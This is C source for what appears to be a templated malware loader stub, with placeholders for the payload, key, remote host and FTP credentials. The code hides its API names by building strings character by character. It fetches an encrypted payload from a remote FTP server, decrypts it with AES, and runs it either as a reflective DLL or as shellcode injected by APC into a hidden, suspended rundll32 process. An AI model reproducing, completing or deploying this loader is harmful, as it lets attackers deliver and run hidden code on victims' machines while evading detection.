#include <windows.h>
#include <tlhelp32.h>
#include <bcrypt.h>
#include <string.h>
#include "ReflectiveLoader.h"
#include <stdio.h>

#ifdef DEBUG
  // variadic macro that works even if you pass only fmt
  #define DBG(fmt, ...) do {                                    \
      char _dbgbuf[256];                                         \
      snprintf(_dbgbuf, sizeof(_dbgbuf), fmt, ##__VA_ARGS__);   \
      OutputDebugStringA(_dbgbuf);                               \
  } while(0)
#else
  #define DBG(fmt, ...) do { } while(0)
#endif

#pragma comment(lib, "bcrypt.lib")

typedef void* HINTERNET;
typedef unsigned short INTERNET_PORT;

#define INTERNET_DEFAULT_FTP_PORT 21
#define INTERNET_SERVICE_FTP 1
#define INTERNET_FLAG_PASSIVE 0x08000000
#define FTP_TRANSFER_TYPE_BINARY 0x00000002
#ifndef GENERIC_READ
#define GENERIC_READ 0x80000000
#endif

#ifndef DLLMAIN
typedef BOOL (WINAPI *DLLMAIN)(HINSTANCE, DWORD, LPVOID);
#endif

typedef HMODULE(WINAPI* tLoadLibA)(LPCSTR);
typedef FARPROC(WINAPI* tGetProcA)(HMODULE, LPCSTR);
tLoadLibA pLoadLibA;
tGetProcA pGetProcA;

unsigned char payload[] = { {{PAYLOAD_ARRAY}} };
size_t payload_len = {{PAYLOAD_SIZE}};
unsigned char *payload_ptr = NULL;
char key[] = {{KEY}};
char enc_algo[] = {{ENC_ALGO}};
char payload_type[] = {{PAYLOAD_TYPE}};
char FTP_USER[] = "{{FTP_USER}}";
char FTP_PASS[] = "{{FTP_PASS}}";
wchar_t IP[64] = L"{{IP}}";
wchar_t PATH[128] = L"{{PATH}}";
short PORT = {{PORT}};

void decrypt_payload(unsigned char *buf, size_t len) {
    if (strcmp(enc_algo, "aes") != 0) return;
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbKeyObject = 0, cbData = 0, cbResult = 0;
    PUCHAR pbKeyObject = NULL;
    unsigned char key_material[16] = {0};
    size_t key_len = strlen(key);
    for (int i = 0; i < 16; i++) key_material[i] = (i < key_len) ? key[i] : 0;
    unsigned char iv[16] = {0};
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return;
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;
    pbKeyObject = HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (!pbKeyObject) goto cleanup;
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, key_material, 16, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;
    BCryptDecrypt(hKey, buf, len, NULL, iv, sizeof(iv), buf, len, &cbData, 0);
cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    if (pbKeyObject) HeapFree(GetProcessHeap(), 0, pbKeyObject);
}

int download_payload() {
    char str_wininet[] = { 'w','i','n','i','n','e','t','.','d','l','l','\0' };
    char str_open[] = { 'I','n','t','e','r','n','e','t','O','p','e','n','A','\0' };
    char str_connect[] = { 'I','n','t','e','r','n','e','t','C','o','n','n','e','c','t','A','\0' };
    char str_ftpopen[] = { 'F','t','p','O','p','e','n','F','i','l','e','A','\0' };
    char str_read[] = { 'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e','\0' };
    char str_close[] = { 'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d','l','e','\0' };
    char str_agent[] = { 'F','T','P','R','e','a','d','e','r','\0' };

    HMODULE hWinInet = pLoadLibA(str_wininet);
    if (!hWinInet) return 0;

    typedef HINTERNET(WINAPI *fnInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
    typedef HINTERNET(WINAPI *fnInternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
    typedef HINTERNET(WINAPI *fnFtpOpenFileA)(HINTERNET, LPCSTR, DWORD, DWORD, DWORD_PTR);
    typedef BOOL(WINAPI *fnInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
    typedef BOOL(WINAPI *fnInternetCloseHandle)(HINTERNET);

    fnInternetOpenA InternetOpenA_ = (fnInternetOpenA)pGetProcA(hWinInet, str_open);
    fnInternetConnectA InternetConnectA_ = (fnInternetConnectA)pGetProcA(hWinInet, str_connect);
    fnFtpOpenFileA FtpOpenFileA_ = (fnFtpOpenFileA)pGetProcA(hWinInet, str_ftpopen);
    fnInternetReadFile InternetReadFile_ = (fnInternetReadFile)pGetProcA(hWinInet, str_read);
    fnInternetCloseHandle InternetCloseHandle_ = (fnInternetCloseHandle)pGetProcA(hWinInet, str_close);

    if (!InternetOpenA_ || !InternetConnectA_ || !FtpOpenFileA_ || !InternetReadFile_ || !InternetCloseHandle_) return 0;

    char ipA[128], pathA[128];
    wcstombs(ipA, IP, sizeof(ipA));
    wcstombs(pathA, PATH, sizeof(pathA));

    HINTERNET hInet = InternetOpenA_(str_agent, 1, NULL, NULL, 0);
    if (!hInet) return 0;

    HINTERNET hFtp = InternetConnectA_(hInet, ipA, INTERNET_DEFAULT_FTP_PORT, FTP_USER, FTP_PASS, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
    if (!hFtp) { InternetCloseHandle_(hInet); return 0; }

    HINTERNET hFile = FtpOpenFileA_(hFtp, pathA, GENERIC_READ, FTP_TRANSFER_TYPE_BINARY, 0);
    if (!hFile) { InternetCloseHandle_(hFtp); InternetCloseHandle_(hInet); return 0; }

    unsigned char tmp[4096]; DWORD r = 0;
    payload_ptr = (unsigned char*)malloc(1);
    payload_len = 0; size_t capacity = 0;

    while (InternetReadFile_(hFile, tmp, sizeof(tmp), &r) && r > 0) {
        if (payload_len + r > capacity) {
            capacity = (capacity == 0) ? 8192 : capacity * 2;
            payload_ptr = (unsigned char*)realloc(payload_ptr, capacity);
        }
        memcpy(payload_ptr + payload_len, tmp, r);
        payload_len += r;
    }

    InternetCloseHandle_(hFile);
    InternetCloseHandle_(hFtp);
    InternetCloseHandle_(hInet);
    return 1;
}

void execute_reflective_dll(unsigned char *dll_buf, size_t dll_len) {
    LPVOID dll_mem = VirtualAlloc(NULL, dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!dll_mem) return;
    memcpy(dll_mem, dll_buf, dll_len);
    DWORD offset = GetReflectiveLoaderOffset(dll_mem);
    if (!offset) return;
    DLLMAIN entry = (DLLMAIN)((ULONG_PTR)dll_mem + offset);
    entry((HINSTANCE)dll_mem, DLL_PROCESS_ATTACH, NULL);
}

void inject_APC(unsigned char *sc, size_t l) {
    char str_target[] = "C:\\Windows\\System32\\rundll32.exe";

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(str_target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return;

    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, l, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) { TerminateProcess(pi.hProcess, 1); return; }
    if (!WriteProcessMemory(pi.hProcess, mem, sc, l, NULL)) { TerminateProcess(pi.hProcess, 1); return; }

    QueueUserAPC((PAPCFUNC)mem, pi.hThread, (ULONG_PTR)mem);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

int main() {
    DBG("[*] stub: entry\n");
    unsigned char *buf = payload;
    size_t len = payload_len;

    if (wcslen(IP) > 0 && PATH[0] != 0) {
        DBG("[*] stub: downloading payload from %ls:%d / %ls\n", IP, PORT, PATH);
        pLoadLibA = (tLoadLibA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        pGetProcA = (tGetProcA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");
        if (!download_payload()) {
            DBG("[!] stub: download_payload failed\n");
            return -1;
        }
        DBG("[*] stub: downloaded %zu bytes\n", payload_len);
        buf = payload_ptr;
        len = payload_len;
    }

    DBG("[*] stub: decrypting payload (len=%zu)\n", len);
    decrypt_payload(buf, len);
    DBG("[*] stub: decrypt complete\n");

    if (strcmp(payload_type, "dll") == 0) {
        DBG("[*] stub: executing reflective DLL\n");
        execute_reflective_dll(buf, len);
        DBG("[*] stub: execute_reflective_dll returned\n");
    }
    else if (strcmp(payload_type, "shellcode") == 0) {
        DBG("[*] stub: injecting shellcode via APC\n");
        inject_APC(buf, len);
        DBG("[*] stub: inject_APC returned\n");
    }

    DBG("[*] stub: exit normally\n");
    return 0;
}